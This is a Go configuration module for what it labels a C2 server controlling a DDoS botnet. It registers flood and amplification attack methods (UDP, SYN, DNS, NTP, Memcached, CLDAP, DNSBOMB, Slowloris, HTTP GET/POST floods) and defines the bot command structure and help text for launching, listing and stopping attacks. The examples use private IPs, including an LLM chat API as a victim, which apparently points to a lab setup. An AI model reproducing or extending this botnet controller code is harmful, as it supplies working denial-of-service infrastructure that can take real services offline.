package config

import (
	"fmt"
	"sync"
)

// Global configuration
const (
	// ServerPort C2 server listening port
	ServerPort = ":80"
	// HistoryFile Command history file
	HistoryFile = ".c2_history"
	// LogFile Bot connection log file
	LogFile = "bots.log"
	// Version C2 server version
	Version = "v2.2"
	// ConfigDir HTTP attack configuration file directory
	ConfigDir                = "config"
	ShowCommandPreviewLength = 1000
)

type BotCommand struct {
	Method  string `json:"method"`
	IP      string `json:"ip"`
	Port    int    `json:"port"`
	Path    string `json:"path"`
	Header  string `json:"header"`
	Payload string `json:"payload"`
}

// Attack method categories
var (
	// Layer4Methods Network layer attack methods
	Layer4Methods = map[string]bool{
		"UDP":          true,
		"SYN":          true,
		"DNS":          true,
		"NTP":          true,
		"CLDAP":        true,
		"RDP":          true,
		"SSDP":         true,
		"SNMP":         true,
		"CHARGEN":      true,
		"OPENVPN":      true,
		"MEMCACHED":    true,
		"DNSBOMB":      true,
		"DNSBOOMERANG": true,
	}

	// HTTPMethods HTTP attack methods
	HTTPMethods = map[string]bool{
		"GET":       true,
		"POST":      true,
		"CURL":      true,
		"SLOWLORIS": true,
	}

	// RegisteredMethods All registered attack methods
	RegisteredMethods = []string{}

	// Mutex to protect configuration
	configMu sync.RWMutex
)

// Attack method descriptions
var (
	// Layer4Description Network layer attack method descriptions
	Layer4Description = map[string]string{
		"UDP":          "UDP flood attack",
		"SYN":          "TCP SYN flood",
		"DNS":          "DNS amplification attack",
		"NTP":          "NTP amplification attack",
		"CLDAP":        "CLDAP amplification attack",
		"RDP":          "RDP amplification attack",
		"SSDP":         "SSDP amplification attack",
		"SNMP":         "SNMP amplification attack",
		"CHARGEN":      "CHARGEN amplification attack",
		"OPENVPN":      "OPENVPN amplification attack",
		"MEMCACHED":    "MEMCACHED amplification attack",
		"DNSBOMB":      "Pulse DoS attack from 2024 IEEE S&P paper",
		"DNSBOOMERANG": "Pulse DNS attack",
	}

	// HTTPDescription HTTP attack method descriptions
	HTTPDescription = map[string]string{
		"GET":  "HTTP GET request, requires attack path, can load headers from folder",
		"POST": "HTTP POST flood attack, requires attack path, can load headers/payload from folder",
	}
)

// Init initializes the configuration
func Init() {
	configMu.Lock()
	defer configMu.Unlock()

	// Register all attack methods
	RegisteredMethods = make([]string, 0, len(Layer4Methods)+len(HTTPMethods))

	// Register Layer4 methods
	for method := range Layer4Methods {
		RegisteredMethods = append(RegisteredMethods, method)
	}

	// Register HTTP methods
	for method := range HTTPMethods {
		RegisteredMethods = append(RegisteredMethods, method)
	}
}

// IsValidMethod checks if an attack method is valid
func IsValidMethod(method string) bool {
	configMu.RLock()
	defer configMu.RUnlock()

	if Layer4Methods[method] || HTTPMethods[method] {
		return true
	}
	return false
}

// IsHTTPMethod checks if it is an HTTP attack method
func IsHTTPMethod(method string) bool {
	configMu.RLock()
	defer configMu.RUnlock()

	return HTTPMethods[method]
}

// IsLayer4Method checks if it is a Layer4 attack method
func IsLayer4Method(method string) bool {
	configMu.RLock()
	defer configMu.RUnlock()

	return Layer4Methods[method]
}

// GetMethodDescription retrieves the description of an attack method
func GetMethodDescription(method string) string {
	configMu.RLock()
	defer configMu.RUnlock()

	if desc, ok := Layer4Description[method]; ok {
		return desc
	}

	if desc, ok := HTTPDescription[method]; ok {
		return desc
	}

	return "Unknown attack method"
}

// GetAllMethods retrieves all registered attack methods
func GetAllMethods() []string {
	configMu.RLock()
	defer configMu.RUnlock()

	return append([]string{}, RegisteredMethods...)
}

// GetCommandHelp retrieves command help information
func GetCommandHelp() string {
	return `
Available Commands:
  attack <method> <target IP> <port> [path] [configName/botIP]                       - Launch attack
  list                                                                               - List all bots
  info <bot IP>                                                                      - Show bot details
  clear                                                                              - Clear screen
  help                                                                               - Show help
  stop                                                                               - Stop specified/all bots
  exit                                                                               - Exit program

Attack Methods:
  UDP           - UDP flood attack
  SYN           - TCP SYN flood
  DNS           - DNS amplification attack
  NTP           - NTP attack
  CLDAP         - CLDAP attack
  RDP           - RDP attack
  SSDP          - SSDP attack
  SNMP          - SNMP attack
  CHARGEN       - CHARGEN attack
  OPENVPN       - OPENVPN attack
  MEMCACHED     - MEMCACHED attack
  DNSBOMB       - Pulse DoS attack from 2024 IEEE S&P paper
  DNSBOOMERANG  - Pulse DNS attack
  GET           - HTTP GET request, requires attack path, can load headers from config folder
  POST          - HTTP POST flood attack, requires attack path, can load headers/payload from config folder
  SLOWLORIS	    - Slowloris attack
  CURL			- CURL attack, use rate-limiting

GET Attack:
  download: target 10.180.0.71:80/download/test.txt, directory from config/get/ 
  get_html: target 10.180.0.71:80/, directory from config/get/
  CURL_download: target 10.180.0.71:80/, directory from config/curl/
  slowloris: target 10.180.0.71:80/, adjust threads 1000

POST Attack:
  deepseek: target 10.153.0.71:11434/api/chat, payload from config/deepseek/

You can deploy any services you are interested in on the victim and configure the related HTTP methods.

Examples:
  attack UDP 192.168.1.100 80                 - Layer 4 attack
  attack UDP 192.168.1.100 80 10.0.0.1        - Layer 4 attack from specific bot
  attack GET 10.100.0.150 80 /history.html    - HTTP GET attack
  attack POST 10.153.0.71 11434 /api/chat deepseek - Load from config/deepseek/
  attack POST 10.100.0.150 80 /login.php 10.0.0.1  - POST attack from specific bot
  stop 10.0.0.1                               - Stop specified bot
  stop                                        - Stop all bots`
}

// GetBanner retrieves the program banner
func GetBanner() string {
	return fmt.Sprintf(`
  ____ ____   ___   ___   ___  
 / ___|___ \ / _ \ / _ \ / _ \ 
| |     __) | | | | | | | | | |
| |___ / __/| |_| | |_| | |_| |
 \____|_____|\___/ \___/ \___/  %s

C2 Control Center Initialized
Type 'help' to see available commands`, Version)
}
